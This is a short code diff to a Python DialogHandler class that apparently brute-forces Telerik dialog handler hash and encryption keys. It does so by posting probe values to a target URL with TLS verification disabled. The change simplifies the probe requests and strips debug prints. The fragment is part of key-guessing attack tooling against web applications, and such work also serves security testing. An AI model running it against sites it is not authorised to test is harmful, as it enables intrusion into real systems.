@@ -493,18 +493,8 @@ class DialogHandler:
 
             for hash_key_probe, hash_key in hashkey_generator:
                 hashkey_counter += 1
-                # Create a dummy encrypted parameter to test the hash key
-                dummy_encrypted = base64.b64encode(b"A" * 16).decode()  # 16 bytes of padding
-                dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(hash_key_probe, dummy_encrypted)
-                data = {"dialogParametersHolder": dialog_parameters}
+                data = {"dialogParametersHolder": hash_key_probe}
                 res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
-                print("!!!!!!!!!!!!!")
-                print("trying hash key: ", hash_key)
-                print(f"Response status: {res.status_code}")
-               # print(f"Response text: {res.text}")
-                print(f"Response headers: {res.headers}")
-                print(f"Response url: {res.url}")
-             #   print(f"Response request: {res.request.body}")
                 if hasattr(self, "debug") and self.debug:
                     print(f"\n[DEBUG] Testing hash key #{hashkey_counter}: {hash_key}")
                     print(f"[DEBUG] Sending request to: {self.url}")
@@ -542,10 +532,7 @@ class DialogHandler:
 
                 for encryption_key_probe, encryption_key in encryptionkey_generator:
                     encryptionkey_counter += 1
-                    # Create a dummy encrypted parameter to test the encryption key
-                    dummy_encrypted = base64.b64encode(b"A" * 16).decode()  # 16 bytes of padding
-                    dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, dummy_encrypted)
-                    data = {"dialogParametersHolder": dialog_parameters}
+                    data = {"dialogParametersHolder": encryption_key_probe}
                     if hasattr(self, "debug") and self.debug:
                         print(f"\n[DEBUG] Testing encryption key #{encryptionkey_counter}: {encryption_key}")
                         print(f"[DEBUG] Sending request to: {self.url}")
